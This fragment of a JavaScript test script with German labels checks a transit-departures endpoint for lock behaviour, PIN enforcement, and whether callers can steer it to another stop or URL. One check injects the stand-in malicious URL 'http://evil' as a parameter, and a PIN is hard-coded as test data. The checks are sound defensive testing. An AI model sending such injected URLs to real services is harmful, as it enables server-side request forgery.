  check('I7 Abfahrten blockieren nicht die Script-Sperre (Formulare laufen weiter, auch wenn der Fahrplandienst hängt)', locks === 0, locks);
}
check('I8 Abfahrten nur mit PIN/Token', G({ action: 'departures' }).code === 'pin' && G({ action: 'departures', pin: '99999' }).code === 'pin');
check('I9 Abfahrten: keine fremde Haltestelle/URL steuerbar (Parameter ignoriert)', (() => { const r = G({ action: 'departures', pin: '13059', stop: 'x', url: 'http://evil' }); return r.ok !== undefined; })());

console.log(fails ? `>>> ${fails} BEFUND(E)` : '>>> KEINE BEFUNDE');
process.exitCode = fails ? 1 : 0;
